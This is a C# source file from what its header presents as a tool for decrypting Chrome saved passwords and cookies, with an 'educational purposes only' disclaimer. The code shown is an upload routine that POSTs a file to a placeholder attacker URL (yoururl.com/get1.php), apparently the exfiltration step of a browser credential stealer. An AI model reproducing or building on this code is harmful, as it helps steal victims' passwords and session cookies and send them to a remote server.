﻿/* Decrypts Chrome V80 and above password and cookies. 
*  but currently displays in console
*  Written By Dextertech
*  Twitter: DextertechV
*  Discord: DexterTech111#7106

	Although not well documented as there was no demand for this project
	and i was in a hurry. download visual studio, open solution and enjoy!
	
	Disclaimer: this code is for educational purposes only and i will not
	be held liable for any misuse of this code.
*/
using System;
using System.Collections.Generic;
using System.Text;
using System.Net;

namespace Eragon
{
    class PostFile
    {
        public void updateDesignpageClient(string filepath)
        {
            string url_ = "https://www.yoururl.com/get1.php";
            try
            {
                WebClient client = new WebClient();
                byte[] bret = client.UploadFile(url_, "POST", filepath);
                string html = System.Text.Encoding.ASCII.GetString(bret);

                Console.WriteLine("Uploaded!");


            }
            catch 
            {
                Console.WriteLine("Could not upload ");
                //  lconnect.Text = ex.ToString();
            }
        }
    }

}